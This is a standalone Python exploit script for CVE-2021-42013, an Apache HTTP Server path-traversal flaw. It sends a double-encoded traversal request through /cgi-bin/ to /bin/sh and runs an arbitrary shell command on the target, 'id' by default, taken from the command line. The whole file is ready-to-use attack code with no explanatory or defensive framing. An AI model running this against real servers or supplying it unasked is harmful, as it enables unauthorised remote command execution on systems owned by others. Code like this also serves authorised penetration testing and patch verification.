# cve_2021_42013_apache_bypass_rce.py
import requests
import sys

def exploit(target_url, cmd="id"):
    if not target_url.startswith("http"):
        target_url = "http://" + target_url

    payload_url = f"{target_url}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"echo Content-Type: text/plain; echo; {cmd}"

    print(f"[+] Target: {target_url}")
    r = requests.post(payload_url, headers=headers, data=data)

    print(f"--- Response ({r.status_code}) ---")
    print(r.text)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 cve_2021_42013_apache_bypass_rce.py <target> [command]")
        sys.exit(1)
    target = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"
    exploit(target, command)
